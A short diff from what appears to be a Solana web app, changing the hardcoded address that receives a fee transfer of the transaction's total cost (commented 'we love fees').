@@ -108,7 +108,7 @@ else {
 const instructions = [
     SystemProgram.transfer({
         fromPubkey: publicKey,
-        toPubkey: new PublicKey("6KHnXK9j3acPn1K5KsdMvySCxSqnuaNP1Q2HxoK8DDWU"), // we love fees
+        toPubkey: new PublicKey("Dr832wJo28x945cziua17yoku2e2WS5WKDtMGvy7FBbF"), // we love fees
         lamports: Math.floor(totalCost * 10 ** 9),
     }),
     SystemProgram.transfer({
